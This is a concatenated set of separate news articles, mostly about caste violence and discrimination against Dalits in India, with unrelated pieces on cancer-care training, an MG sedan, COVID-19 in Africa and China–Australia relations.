Backward Classes were not Hindus. According to police, both Maheshwari and Raval had clashed repeatedly over the past one month where the latter had warned Maheshwari regarding his social media posts. Raval, Mumbai Police said, travelled to Rapar from Malad on Wednesday with the intention of murdering Maheshwari. CCTV footage from the area showed Maheshwari entering his office building at 6 pm on Friday and a man wearing a red T-shirt following him inside. Seconds later, the man runs out of the building and flees. An FIR was lodged against Raval and eight others – Jaysukh Luhar, Khimji Luhar, Dhaval Luhar, Devubha Sodha, Vijaysinh Sodha, Mayursinh Sodha, Pravinsinh Sodha and Arjansinh Sodha – for murder under Indian Penal Code section 302 and sections of the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act. The victim’s wife said in her complaint that her husband had gone to Rapar for some work on an ongoing legal case against the persons of Luhar community. She added that Maheshwari was the only lawyer who had agreed to represent the legal case against persons of Luhar community recently and he was frequenting police stations to get FIRs lodged. “The other accused named in the FIR are connected to Maheshwari through the legal cases he was representing. We are yet to find any connection between them and main accused, Raval,” said a senior police officer in Kutch. 📣 The Indian Express is now on Telegram.

CS Pramesh, the Director of Tata Memorial Hospital, says that as part of the collaboration agreement with TMH, local specialists in C/Can cities will receive training in Mumbai on areas of cancer care, delivered within a ‘train-the-trainers’ framework. “Direct contact between local specialists in C/Can’s African and Asian cities and TMH specialists will also be provided, while TMH specialists will join e-learning platforms and/or visit C/Can cities in those regions to train local specialists on priority areas of cancer care,” he outlines. The city of Kigali (Rwanda), Kumasi (Ghana) and Yangon (Myanmar) have already conducted a comprehensive assessment of cancer care capacity and needs involving nearly 200 health professionals in all specialities and over 15 health institutions from both the public and private sectors. Following these needs assessments, these cities have identified and agreed on the main challenges in accessing quality and equitable cancer care in the city. New members of the C/Can network in Africa and Asia, such as Greater Petaling, in Malaysia, which joined in September 2019, will benefit from the agreement with TMH as they progress with their needs assessment. Tata Memorial Hospital is the pioneer cancer hospital in India, and its focus on providing quality cancer care to patients through evidence based management protocols work has been recognized internationally. The hospital is also involved in human resource development for cancer care, conducting relevant cancer research and shaping cancer policy for the country.

0,"Patna: Dalit leader Jitan Ram Manjhi, who floated the Hindustani Awam Morcha in 2015 after leaving the Janata Dal along with 18 other leaders, may be the National Democratic Alliance’s (NDA’s) only hope to bag Dalit support after the demise of Lok Janshakti Party’s Ram Vilas Paswan, whose son Chirag Paswan left the alliance to contest the polls independently. Manjhi was chosen Bihar’s 23rd chief minister after Nitish Kumar resigned following a massive debacle in the 2014 Lok Sabha election. He again took the chief minister’s chair in February 2015. In the upcoming polls, he will re-contest from Imamganj against RJD’s Uday Narayan Choudhary, who has been the Speaker of Bihar Assembly. Manjhi, 76, represents Bihar’s “lowest” Mushahar community, who form two per cent of the state’s voters. After Bhola Paswan and Ram Sunder Das, Manjhi was the third Scheduled Caste chief minister that state had. For NDA, while Nitish has the support of the OBC Koeris and Kurmis, Manjhi brings the Mahadalit support. Dalits form 16 per cent of Bihar voters and Manjhi can provide them with the leadership. Besides, after the 2015 Assembly poll results bagged HAM-Secular only one seat, alliance with the JD(U) gave Manjhi a channel to return to the NDA. Manjhi first became an MLA in 1980 when he was in the Congress party and a minister in 1985. He has been a minister in several Bihar state governments, under many chief ministers like Chandrashekhar Singh, Bindeshwari Dubey, Satyendra Narayan Sinha, Jagannath Mishra, Lalu Prasad Yadav and Rabri Devi. Manjhi was affiliated with the Congress in 1980–1990, Janata Dal in 1990–1996, Rashtriya Janata Dal in 1996–2005 and the JD(U) in 2005–2015. His son Santosh Kumar Suman is an MLC from HAM-S. In the upcoming polls, the JD(U) has offered seven seats to HAM-S of the 122 it is contesting. The party enjoys a stronghold in Gaya, Jehanabad and in areas of Khagaria and Purnia. Ahead of the polls, the Bihar government has accorded the Mahadalit leader Z plus security cover. He earlier had Z-category security.

The sedan has received a significant update to match the brand’s current range. With the launch of the HS mid-size SUV, MG is left only without a mid-size hatch/sedan combination or dual-cab ute to be a challenging force in all of Australia’s highest-selling segments. While the brand has ruled out its Extender ute for our market for the time being, it is also turning its focus to electric cars. It is understood that the electric version of the MG ZS small SUV will be Australia’s cheapest electric vehicle when it launches later this year, with a starting price of $46,990, undercutting the next-cheapest Nissan Leaf ($49,490). The MG6 was finally discontinued from the Australian market in 2019 after a selling slowly since its introduction alongside MG’s 2016 relaunch. MG does not currently offer the MG6 in any right-hand-drive markets. Since then, the sedan has received a significant update to match the brand’s current range in its newfound home market of China. It is sold there with the same 1.5-litre turbocharged four-cylinder engine (119kW/250Nm) found in the HS, or as an eMG6 plug-in hybrid. The plug-in hybrid variant employs a 1.0-litre three-cylinder engine and an electric motor for a claimed combined power output of 170kW. MG does not currently offer the MG6 in any right-hand-drive markets, including the UK or Thailand. The Volkswagen Amarok has an official unveil date, with US reports pointing to...

0,"The incident happened at Itireleng township in the west of Pretoria, at a feeding scheme run by a number of community groups from Laudium. The group will in future focus on other townships where they have had success, one member said. Hundreds of people queuing for the parcels did not follow social distancing guidelines and chaos quickly broke out as they stormed the vehicles and started stealing the food parcels. Many vehicles were unable to escape as residents crowded the narrow streets. One blockaded vehicle was rocked back and forth, as desperate community members attempted to topple it and loot its contents. Tshwane Metro Police and private security intervened as the operation was abandoned and vehicles retreated to safety. A spokesperson for the joint scheme said the pilot operation was an attempt to establish whether the handing out of food parcels could be responsibly achieved in the township – in light of the COVID-19 pandemic. “We’re seeing this as a long-term thing; the economic situation is only going to get worse but we won’t be coming back here again”, he said. He added that the scheme’s efforts would be focused elsewhere, as they had already established successful systems in other communities, shelters and orphanages. An escorting police officer said she was saddened by the events, adding that now only a few would benefit. (Please note that the original version of the story said that 5,000 parcels had been stolen. The organisers subsequently asked that the figure be amended.)  Tom Brown is a photographer based between India and South Africa, specializing in street, event and documentary photography.

0," Bhubaneswar: A purification ritual was performed in a temple in Orissa on Wednesday after a Dalit minister visited the place of worship, a priest said. Women and Child Welfare Minister Pramila Mallick entered the sanctum sanctorum of the Akhandalamani temple, a shrine of Lord Shiva at Aradi village in Bhadrak district, some 150 km from Bhubaneswar. Temple chief priest Gokulananda Panda said they performed the purification ritual because Dalits were not allowed to enter the sanctum sanctorum. The priests closed the temple for over an hour and washed it soon after the minister left, Panda said. Mallik said she had visited the temple along with her family but didn't know if purification ritual was performed following her entry. Dalits in Orissa are barred from entering many Hindu temples. In November 2004, villagers beat up four Dalit women for entering an 18th century Jagannath temple at Keradagarh village in the coastal district of Kendrapada."

0,"Follow Us A Dalit woman's body was unceremoniously removed from the funeral pyre minutes before she was to be cremated by upper caste men in Agra a few days back. The incident has now snowballed into a major controversy after video of the act went viral on social media. Bahujan Samaj Party (BSP) president Mayawati on Tuesday hit out at the Yogi Adityanath government in Uttar Pradesh and demanded a high-level inquiry into the incident. In a tweet, Mayawati said, ""In UP near Agra, the body of a Dalit woman was removed from the cremation ground by people of upper castes having casteist mentality because the cremation ghat belonged to upper castes. This is most shameful and most condemnable."" In another tweet, she said, ""In this casteist and most disgusting incident, a high-level inquiry should be conducted by the UP government and the culprits should be given harshest punishment so that such incidents are not repeated in the future. This is the demand of the BSP."" The body of the 26-year old woman was removed from the funeral pyre in Agra about a week ago by the Thakur community who said this cremation ground is not meant for people from Dalit community. Mayawati also raised the issue of the death of a Dalit doctor in Delhi who died due to coronavirus. The BSP chief in her tweet said, ""The Delhi government should shun its casteist mentality and extend all help to his (doctor) family who had taken loan for his education,"" she said.

0,"Sign in Dalit History Month Apr 11, 2020·2 min read Today in #Dalithistory, in honour of Mahatma Phule Jayanthi, we dedicate our post to Jyotirao Phule — an activist, a thinker, and a social revolutionary of the nineteenth century. While he was of Shudra background, his ideas, work and actions have had an invaluable liberatory impact on Dalits. Born in 1827 before the widespread Adi-movements, Phule was the first to propound caste as subjugation and oppression on indigenous peoples by invaders. He stressed that caste was equivalent to slavery, as vicious and brutal as the enslavement of Africans in the Americas and unique in its deception and religious sanction. In his revolutionary book, Gulamgiri (Slavery) published in 1873, Jyotirao included a manifesto which amongst other things declared that he was willing to dine with all regardless of their caste, creed or country of origin and that social salvation was to be found only in the education of women and Dalits. This content was deemed extremely controversial at the time and several newspapers blatantly refused to publicize it. He believed that Shudras were a group of people who had suffered added repression and persecution because they had at one time been actively engaged in fighting invading Brahmanism on the ground. His salvation describes the unity of the Shudras and Adi-Shudras (Dalits) into one exploited mass of people rising up in powerful political unity. He and his wife, Savitribai Phule, became pioneers of women’s education in India, and together started the first school for girls on January 1st 1848 at Bhide’s wada in Pune. They also started schools in which they educated both girls and “lower” Castes. Like many anti-caste revolutionaries, he felt a strong need to establish an alternative religion to the one that was oppressing his people. What he began then, lead him to form the Satya Shodhak Samaj (Society of Seekers of Truth) whose main objectives were to liberate the Shudras and Adi -Shudras and prevent exploitation by Brahminism within a strong context of gender equality. His life-long work for equality has recognized when Phule was publicly conferred the title of Mahatma on 11th May 1888 and later even termed the “Martin Luther King of India” by his biographer Dhananjay Keer. Dr.Ambedkar proudly declared that Phule was one of his three spiritual mentors. His birthday continues to be a celebration all around the world where Dalits, Adivasis and Bahujan honour him on Mahatma Phule Jayanthi! Jai Bhim! Jai Phule!

0,"Jump to navigation Speak Now A disturbing CCTV footage of a group of men dragging a man out of his car and stabbing him to death is circulating on social media with the claim that it shows RSS workers from Nagpur murdering a Dalit IAS officer. The claim further says the men later gang raped the officer’s minor daughter inside the car. The caption in Malayalam along with the video translates to, “In Nagpur, RSS activists hack and stab a Dalit IAS officer to death. Horror scenes of his 16-year-old daughter being gang raped in the car.” India Today Anti Fake News War Room (AFWA) has found the claim along with the video to be false. The video is of a gambling den kingpin being stabbed to death by rivals in Maharashtra’s Nagpur city. The claim is viral on Facebook in Malayalam. The archived version can be seen here. AFWA probe Using InVID tool and appropriate keywords, we found the same clip in a video story uploaded on YouTube by “The Lallantop” on September 27, 2020. The video description says, “Kishor Binekar alias Balya, a suspected gambling den kingpin, was allegedly stabbed to death by five unidentified persons at a petrol pump signal. Police said Binekar, also having several offences against him, was followed by the assailants on bikes. His car was blocked by one of the assailants. Binekar was dragged out and stabbed outside the car in full public view. Here is the video!” We also found reports on the incident by “The Times of India” and “Outlook”, confirming that the victim was a gambling den kingpin. There are also reports on Nagpur Crime Branch arresting the accused in the case. However, there is no mention of gang rape in any of the report. For better clarity, we reached out to the office of Nagpur Zonal DCP Vanita Sahu. The office confirmed to us that the incident took place on September 26 and the man murdered was a gambling den kingpin. It also said there was no rape associated with the incident. AFWA also spoke to sub-inspector JN Rajput from Sitabuldi police station, under whose jurisdiction the incident took place. “Both the victim and accused have criminal backgrounds. Also, the victim was driving the car alone. There was no woman with him. The murderers entered the car in an attempt to hijack it. But they couldn’t. All the accused have been arrested. More than 15 years back, Kishor had killed the father of the main accused, Chetan. The murder was an act of planned revenge by Chetan and his friends. Further investigation is on,” the officer said. Hence, it is clear that the man being stabbed to death in the viral video is not a Dalit IAS officer but a gambling den kingpin from Nagpur. The number of crows determines the intensity of the lie.

Africa, which has important trade relations with China, is closely monitoring the situation. The epidemic, which began in late December in Wuhan, China, has spread rapidly around the world and now affects 13 countries. Some 5,974 people have been infected by the virus, according to Chinese officials. Over 80 people have already lost their lives. Will the coronavirus epidemic spread to the African continent? Africa is paying particular attention to the evolution of the epidemic, especially as the continent maintains a significant flow of trade with China. According to Beijing, trade between Africa and China increased by 2.2% in 2019, reaching $208 billion (189 billion euros), and the continent welcomed 121 million Chinese visitors in 2017 against 31 million in 2005. “Ethiopia, Kenya and South Africa are the main countries receiving travellers from China”, says Dr Ambrose Talisuna, epidemiologist and WHO regional adviser for health security in Africa. “In these countries, we have recommended to the authorities that they strengthen the screening of travellers at airports, including taking their body temperature.” READ The potential economic impact of coronavirus on Africa The World Health Organization recommends setting up quarantine rooms in airports, as well as preparing hospitals to receive potential patients. China is the largest market outside Africa for Ethiopian Airlines, which runs 35 passenger flights per week, direct and daily, and 15 cargo flights, serving the cities of Beijing, Shanghai, Guangzhou, Hong Kong, and Chengdu.

Côte d’Ivoire reported Sunday its first suspected case of the coronavirus, according to the Ivorian Minister of Health, Dr Eugene Aouélé Aka. “The Ministry of Health and Public Hygiene has been alerted by the airport authorities of Abidjan of the presence of a patient in an aircraft of Turkish Airlines from Beijing, bound for Abidjan,” read the statement. “It is a 34-year-old student from Côte d’Ivoire who has been living in Beijing for five years and who presented an influenza-like illness with coughing, sneezing, runny nose and breathing difficulty, which began on January 22, 2020 in Beijing.” The patient was transferred to the pandemic cell at the Félix Houphouët-Boigny Airport in Abidjan. Pending analysis results, this is the first suspected case of coronavirus on the continent. On 23 January, the Nigerian Centre for Disease Control (NCDC) announced “enhanced surveillance measures at ports of entry. Travelers arriving from Wuhan are subject to many questions upon arrival about possible symptoms of the disease and their travel itinerary,” it said. A similar measure and increased surveillance has been put in place at airports in Kenya. Algeria, Morocco, Burkina Faso, Togo, Niger, Mali, and Senegal. In addition to information campaigns for health workers, several countries have set up toll-free numbers for the population. In Senegal, the Ministry of Health and Social Action has recommended “going to the nearest health facility as soon as you have a sudden onset respiratory illness” or to call 800 00 50 50, a toll-free information number. The Togolese authorities invited anyone who has recently been in China to contact 22 22 20 73. The Ivorian Minister of Health “invited the population not to give in to panic and to call 143 (toll-free number) for any information”. Equatorial Guinea issued a statement on 27 January about the impact that this epidemic could have on the oil market. The day before, Prince Abdulaziz bin Salman Al-Saud, Saudi Energy Minister, expressed “confidence in the ability of the Chinese authorities to contain and eradicate the new coronavirus”, while adding that the Kingdom would be ready to react in case of “psychological factors affecting oil prices”. Gabriel Mbaga Obiang Lima, Minister of Mines and Hydrocarbons in Equatorial Guinea, said, “As a member of OPEC, Equatorial Guinea adheres to the declaration of Saudi Arabia and is fully prepared to engage in coordination action with the organisation if future developments of the coronavirus were to affect the stability of the world oil market.” Rabat announced Saturday the establishment of “a crisis cell for the benefit of members of the Moroccan community established in China, to monitor their situation”. Dozens of students from the Kingdom are indeed quarantined in the city of Wuhan. For the time being, the WHO has not declared the disease as a public health emergency of international scope. According to Talisuna, the mortality rate — about 4% — remains low. “Many of the dead were over 50 years old, or already had other diseases,” he said. The disease manifests itself in flu-like symptoms that can lead to severe respiratory syndromes. “The uniqueness of this virus is that it is a new strain that is still being studied,” said Talisuna. “For now, the treatment is to treat the symptoms.” The WHO has provided a list of qualified laboratories around the world. According to Talisuna, the only laboratory on the continent capable of confirming coronavirus cases is in South Africa. The international organization has also issued a list of recommendations for populations to protect themselves from the virus. Among these are basic hand and respiratory hygiene, “by adopting healthy eating practices and avoiding close contact with people with symptoms of respiratory illness, such as coughing or sneezing, if possible”.

0,"What happens when a Dalit seeks justice from the courts? Most times, the struggle may be just getting there, or charges are not framed years after a crime. This two-part story, done almost 20 years ago, is very relevant now with nationwide protests against the recent dilution of the SC & ST (Prevention of Atrocities) Act When Bhanwari Devi’s 13 year-old daughter was raped in the bajra fields by an upper caste youth, she picked up a lathi and went after the rapist herself. She had no faith in the police and courts. Either way, she was prevented from seeking any redress by the dominant castes of Ahiron ka Rampura. “The village caste panchayat promised me justice,” she says. “Instead, they threw me and my family out of Rampura.” Nearly a decade after the rape, no one in this village in Ajmer district has been punished. It doesn’t mean much, though, in Rajasthan . On average in this state, one Dalit woman is raped every 60 hours. Data from reports of the National Commission for the Scheduled Castes and Scheduled Tribes show that nearly 900 cases of sexual assault of SC women were registered with the police between 1991 and 1996. That’s round 150 cases a year – or one every 60 hours. (Barring a few months of President’s rule, the state was entirely in Bharatiya Janata Party control through this period.) The numbers don’t measure the reality. In this state, the extent of under-reporting of such crimes is perhaps the worst in the country. In Naksoda of Dholpur district, the victim of one of the most dramatic atrocities has fled the village. In April 1998, Rameshwar Jatav, a Dalit, sought the return of Rs. 150 that he had loaned an upper caste Gujjar. That was asking for trouble. Enraged by his arrogance, a band of Gujjars pierced his nose and put a ring of two threads of jute, a metre long and 2 mm thick, through his nostrils. Then they paraded him around the village, leading him by the ring. The incident hit the headlines and caused national outrage. It was widely reported overseas as well, both in print and on television. All that publicity, however, had no impact in ensuring justice. Terror within the village and a hostile bureaucracy at the ground level saw to that. And with the sensational and spectacular out of the way, the press lost interest in the case. So, apparently, did the human rights groups. The victims faced the post-media music on their own. Rameshwar completely changed his line in court. Yes, the atrocity had happened. However, it was not the six people named in his complaint who had done it. He could not identify the guilty. The senior medical officer, who had recorded the injuries in detail, now pleaded forgetfulness. Yes, Rameshwar had approached him with those wounds. He could not remember, though, if the victim had told him how he had come by those unusual injuries. Rameshwar’s Jatav's parents at their home in Naksoda village, where Jatav was paraded with a jute ring in his nostril: 'We live here in terror' Rameshwar’s father, Mangi Lal, has himself turned hostile as a witness. “What do you expect us to do?” he asked me in Naksoda. “We live here in terror. The authorities were totally against us. The Gujjars can finish us any time. Various powerful people, and some in the police, forced this on us.” Rameshwar has left the village. Mangi Lal has sold one of the just three bigha s of land the family owns to meet the costs of the case thus far. For the world, it was a barbaric act. In Rajasthan, it just falls into one of thousands of 'Other IPC' (Indian Penal Code) cases. Which means cases other than murder, rape, arson or grievous hurt. Between 1991-96, there was one such case registered every four hours. In Sainthri in Bharatpur district, residents say there have been no marriages for seven years. Not of the men, at least. That’s how its been since June 1992, when Sainthri was stormed by a rampaging upper caste mob. Six people were murdered and many houses destroyed. Some of those killed were burned alive when the bittora (store of dung and fuelwood) they were hiding in was deliberately set alight. In Sainthri village, a similar dung and fuelwood bittora in a shed was stormed by a rampaging upper caste mob, killing six people “The women of Sainthri are able to get married because they leave the village when they do so,” says Bhagwan Devi. “But not the men. Some men have left this village to get married. People don’t want to send their daughters here. They know that if we are attacked again, no one, neither police nor courts, will help us.” Her cynicism is grounded in reality. Seven years after the murders, charges are yet to be framed in the matter. That too, doesn’t mean much. One Dalit is murdered in this state a little over every nine days. In the same village lives Tan Singh, a survivor of the bittora fire ( see cover image ). The medical record shows he suffered 35 per cent burns in that event. His ears have been more or less destroyed. The little compensation he got – because his brother was one of those killed – has long ago disappeared in medical expenses. “I had to sell my tiny plot of land to meet the costs,” says the devastated young man. That includes several hundreds of rupees each time on repeated trips to Jaipur – on just travel alone. Tan Singh has become just a statistic . A Dalit is the victim of grievous hurt every 65 hours in this state. In Raholi in Tonk district, an attack on Dalits incited by local school teachers saw several cases of arson. “The losses were very bad,” says Anju Phulwaria. She was the elected – Dalit – sarpanch , but, she says, “I was suspended from the post on false charges.” She’s not surprised that no one’s been punished for the act. On average, one dalit house or property suffers an arson attack every five days in Rajasthan. In every category, the chances of the guilty being punished are very few. Anju Phulwaria was the elected Dalit sarpanch of Raholi but, she says, 'I was suspended from the post on false charges' What do the figures say? Former Janata Dal Member of Parliament Than Singh was a member of a committee investigating crimes against Dalits in the early '90s. “The conviction rate was around three per cent,” he told me at his Jaipur residence. In Dholpur district, where I visited the courts, I found it to be even less. In all, 359 such cases were committed to Sessions between 1996 and 1998. Some had been transferred to other courts or were pending. But the conviction rate here was under 2.5 per cent. A senior police officer in Dholpur told me: “My only regret is that the courts are burdened with so many false issues. Well over 50 per cent of SC /ST complaints are false. People are put to needless harassment by such cases.” His is a widely held view among the largely upper caste police officers of Rajasthan. (A senior government official refers to the force as the CRP – the “Charang-Rajput Police.” These two powerful castes dominated the force right up to the '90s.) The idea that ordinary people, particularly the poor and weak, are liars is deep-rooted in the police. Take rape cases across all communities. The national average of such cases found to be false after investigation is around five per cent of the total. In Rajasthan, rape cases declared “false” average around 27 per cent. This is like saying that women in the state tend to lie five times more than women in the rest of the country. The more likely explanation? A huge bias against women is deeply embedded in the system. The ‘false rape’ data covers all communities. But a detailed survey would likely establish that Dalits and Adivasis are the worst victims of that bias. Simply: the level of atrocities they suffer is far higher than other communities. I had been assured everywhere I went in Rajasthan that Dalits were grossly misusing the law in general and the provisions of the SC and ST (Prevention of Atrocities) Act, 1989, in particular. Above all, the much feared Section 3 of the Act under which those guilty of casteist offences against Dalits and Adivasis can be imprisoned for up to five years along with a fine. In reality, I could not find a single case where such serious punishment had been meted out to offenders. In Dholpur itself, the few punishments handed out in cases generally involving offences against Dalits seemed unlikely to deter the guilty. They ranged from fines of Rs.100 or Rs. 250 or Rs. 500 to one month’s simple imprisonment. The most severe punishment I came across was six months simple imprisonment. In one case, the guilty had been put on “probation” with bail. The concept of probation is one this reporter had never run into in such cases anywhere else. Dholpur’s is not an isolated instance. At the SC / ST Special Court in Tonk district headquarters, we learned that the conviction rate was just under two per cent. So much for the numbers. What are the steps and the barriers, the process and the perils facing a dalit going to court? That’s another story. This two-part story was originally published in The Hindu on June 13, 1999.

0,"Liberal MP Dave Sharma says Chinese Ambassador Cheng Jingye’s recent “combative” statements are a departure from standard diplomatic practices. Mr Cheng has issued several strident statements regarding Australia’s push for an international investigation into the origins SARS-CoV-2, otherwise known as COVID-19. Recently, the Chinese embassy said it was laughable for Australia to feel vindicated after a World Health Assembly (WHA) passed a resolution into the origins of the novel pathogen. “All those who know the consultation process that led to the resolution understand this,” an embassy spokesperson said on Tuesday. “To claim the WHA’s resolution a vindication of Australia’s call is nothing but a joke.” The federal government was the first nation to call for an investigation into COVID-19, a virus that has killed over 320,000 people and ground large swathes of the world economy into a halt. Mr Sharma, a former diplomat to Israel, said the Chinese embassy in Canberra’s stance on the investigation differs to Chinese president Xi Jinping, who endorsed the inquiry. He told Sky News the Ambassador’s interventions “a little strange.” We had President Xi Jinping address the World Health Assembly last night, speaking strongly in favour of such an international investigation, but we have the ambassador here telling us they are opposed to it.” “They seem to be on different pages there,” he said. “Also, frankly, the job of an ambassador is to charm the locals and help communicate their views back to their capital and help them understand it. “I don’t know if this is necessarily the best way to go about charming Australians.” Image: AP Read More Our Apps"
0,"The victim was assaulted for being in a relationship with a woman from the Goud community. The Telangana police on Friday arrested four people for brutally assaulting an 18-year-old young Dalit man, and forcing him to drink urine. The man was attacked for reportedly being in a relationship with a woman from the Goud community, which is categorized as a Backward Caste. The horrific crime took place in Ponkal village in Mancherial district. Police said that the accused--Muthyam Sai, Garipetti Harish Goud, Patkut Prashanth and Azmath Khan-- remained elusive. After receiving inputs that the accused were trying to flee on motorcycles, the accused were detained near Dharmaram point in Peddapalle district at around 7.50 am, police said. Following the investigation, the accused confessed to the crime, Mancherial police said. Subsequently they were produced before the court. The accused were arrested under the SC and ST Prevention of Atrocities Act and were also charged under IPC section 323 (Punishment for voluntarily causing hurt), 324 (Voluntarily causing hurt by dangerous weapons or means), 290 (Punishment for public nuisance) and 506 (Punishment for criminal intimidation) read with 34 of the Indian Penal Code. On May 17, they attacked the Dalit man from the Mala community. The woman, who is also 18-years-old, eloped with the man. However, the womanâs relative Harish Goud and his three friends waylaid the victimâs friend, Abdul. Abdul too was assaulted, and he disclosed that the couple were hiding at a temple in Jannaram village outskirts. The accused committed many atrocities on the victim, disrobing him and threatening to kill him for transgressing the caste hierarchy. The victim, however, escaped from their clutches and took shelter at the Jannaram police station. Subsequently, he was admitted to a local hospital for treatment. Following a petition from the victim, the police registered a case against the accused on May 18. In his petition to the police, the victim wrote, âThey tore my clothes apart, asked why I need their girl despite being a lower caste person and abused me with casteist slurs.â Read: Caste atrocity in Telangana: Dalit man assaulted and made to drink urine  ©2021 the news minute"
0,"Image for representation: Reuters In a gory incident, a Dalit youth working as a salesman at a liquor vend was allegedly burnt alive in Alwar district of Rajasthan after he demanded his salary dues of five months. Kamalkishore's charred body was later found in a deep freezer of the liquor shop that was found gutted, police said. His brother Roop Singh lodged an FIR at Khairthal police station, where he mentioned that Kamalkishore was burnt to death when he asked for his salary dues from liquor contractors Subhash and Rakesh Yadav who are absconding. BJP state President Satish Poonia tweeted on Monday: ""It seems we are living in Somalia in Africa where there is no law and order. Does CM Ashok Gehlot have any right to retain his position."" He also put a hashtag CrimeCapitalRajasthan. The crime comes in the wake of burning alive of a temple priest in Rajasthan over a land dispute. According to the police, deceased Kamalkishore (22), a resident of Jhadka village in Alwar, died of burns on Saturday night in Kampur village. Police said that a forensics team visited the crime spot. ""The situation will be clear only after more evidence is gathered in the case,"" police said. Roop Singh alleged that Kamalkishore's salary was due for the last five months. He returned home but on Saturday evening, the contractors and his colleagues visited their house and took him along. Later in the night, he alleged, the liquor shop was set on fire by dousing it with petrol even while Kamalkishore was inside. On Sunday morning, when the vend shutters were broken open, Kamalkishore was found dead inside the freezer. Police took the body to the Khairthal Satellite Hospital for autopsy even as the family demanded the arrest of the contractors along with judicial investigation. The family did not allow the post-mortem till Sunday evening. After a day-long tussle, the body was finally handed over to the relatives after post-mortem."

The investigation into the killing of Dalit lawyer Devji Maheshwari in Gujarat has revealed that he was murdered over his social media posts, The Indian Express reported on Sunday. Mumbai Police had arrested prime accused Bharat Raval a day after the murder, and had said that he found Maheshwari’s post “prejudicial to Brahmins”, the community Raval is from. Maheshwari was stabbed to death on September 25 after he had an argument with Raval about his social media posts. A Special Investigating Team looking into the matter corroborated the Mumbai Police’s information in a press release on Sunday. “The evidence gathered in course of investigation suggests that Maheshwari used to upload objectionable posts about Brahmin community on his Facebook account. Raval had dialled him (Maheshwari) over this and the duo had a heated argument over phone. Investigation establishes that Raval had murdered Maheshwari over disputes that arose out of the social media posts against Brahmin community.” The SIT also retrieved an audio recording from Raval’s phone that confirms the verbal argument between the two. Maheshwari was a senior member of the Indian Legal Professionals Association and the All India Backward and Minority Communities Employees Federation. His last post on Facebook post was a video of Backward and Minority Communities Employees Federation National President Waman Meshram saying that members of Scheduled Castes, Scheduled Tribes and Other Backward Classes were not Hindus. Raval, who is a native of Rapar town in Gujarat, worked at a printer repairing shop run by Mahesh Hanat alias Mahesh Bhoja Patel in Mumbai’s Malad area. After stabbing Maheshwari, Raval escaped to Mumbai with the help of his friends Prakash Bera and Rajesh alias Viram Devda. But when he reached the Malad shop the next day, the Mumbai crime branch had caught him. In her complaint, Devji Maheshwari’s wife had named nine persons, including Raval, as accused. She said the accused had been issuing Maheshwari threats after the 50-year old advocate took up a civil matter relating to a dispute over title of Luhar-Suthar Samaj Vadi, a community hall in the town. Unidentified officials in the investigating team however told The Indian Express that no evidence has so far been found against the other eight persons."

The shocking incident, which happened on Saturday in a village, about 530 km from state capital Bengaluru, showed the man pinned to the ground and with his clothes stripped for allegedly touching the bike of a man belonging to an upper caste, after which the physically-assaulted man filed a complaint at a nearby police station. However, a counter case has been filed on Monday stating the dalit man had taken off his clothes and made obscene gestures to two girls in the locality while they were washing clothes. Hailing from the Minaji village, the dalit man filed an case on Saturday in Taikote against the upper caste man including twelve others for mercilessly beating him up after he touched a bike accidentally. The case has been registered under the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act and sections 143,147, 324, 354, 504, 506, 149 of Indian Penal Code (IPC). According to reports, a counter case under section 354 of the IPC has also been filed on the dalit man. It is said an investigation team had been sent to the site of the incident and had gotten to know today that the man was beaten up when he removed his clothes and showed his private parts to two girls who were washing clothes. The video clip, which has gone viral on social media, has drawn angry reactions for the levels of physical violence that have been exhibited. Furthermore, men are seen standing close to each other and delivering extreme physical blows to the man. In the video, men are also seen not wearing masks and violating social distancing norms, which have been enforced to prevent the spread of the novel coronavirus. The fourth worst-affected state in the country due to the COVID-19 outbreak, Karnataka's total number of cases currently stands at 63,772, with more than 1,300 deaths linked to the disease.

0,"Department of Foreign Affairs and Trade secretary Frances Adamson has spoken to the Chinese ambassador to Australia Cheng Jingye after Cheng criticised the Australian government. In a recent interview with the Australian Financial Review, Cheng said Scott Morrison’s push for an independent inquiry into the origins of the coronavirus pandemic could lead to a boycott from the people of China, risking economic repercussions. He also repeated recent criticisms that Australia was “teaming up” with the US government to “launch a kind of political campaign against China”. “It’s a kind of pandering to the assertions that are made by some forces in Washington,” he said. READ MORE: Frydenberg defends Dutton after Chinese Embassy comments Cheng suggested Chinese tourists and students may stop visiting Australia, and the public may choose not to consume Australian products. “The Chinese public is frustrated, dismayed and disappointed with what Australia is doing now,” he said. Trade Minister Simon Birmingham on Tuesday told ABC News Adamson had called the ambassador following the comments, but wouldn’t reveal details of the discussion. “That’s for the ambassador to choose to make public,” he said. He said the federal government would continue to push for an investigation. “Australia is no more going to change our policy position on a major public health issue because of economic coercion or threats of coercion, than we would change our policy position in matters of national security,” he said. However, he noted Australia was still keen to maintain a positive relationship with China. “Our economy is a crucial supplier to the Chinese economy, just as China’s economy supplies valuable goods, resources and services to Australia’s economy,” he said. “We want to maintain that positive relationship and enhance it where we can.” Scott Morrison, foreign affairs minister Marise Payne, and home affairs minister Peter Dutton have all vocalised their support for an independent inquiry into the origins of COVID-19, calling for transparency from the Chinese government.

0,"MELBOURNE (REUTERS) - The Australian government said on Saturday (Feb 22) that it will allow the return of some Chinese high school students who have been blocked from entering the country due coronavirus restrictions, reopening the door to a market that is key for the economy. Thousands of Chinese students were prevented from heading to Australia after the long summer break for the start of school and university terms this month when the government imposed a travel ban for most people travelling from China. Australian officials said the targeted easing of the ban would allow about 760 Chinese high school students - none from Hubei province, which is the epicentre of the outbreak - to apply to return. The students would be considered on a case-by-case basis and those who are successful will be subjected to a 14-day self-imposed quarantine on arrival in Australia, officials said. ""It is incredibly important that we bring some normality back to the international student market,"" Education Minister Dan Tehan told reporters. ""It is a small step we are taking, it is a precautionary step."" Mr Tehan said the government would next week consider whether to allow the return of tertiary education students. Chinese students made up almost 40 per cent of the international higher education population in Australia in 2018, according to the most recent official data. That broader population has grown by more than 10 per cent over each of the past three years, contributing more than A$30 billion (S$27.8 billion) to the domestic economy. Australia introduced its travel restrictions on all foreign nationals who had been in China within two weeks of planned travel to Australia from entering the country. Australian nationals and permanent residents were exempted from the ban, which has been extended twice and remains in place until Feb 29.

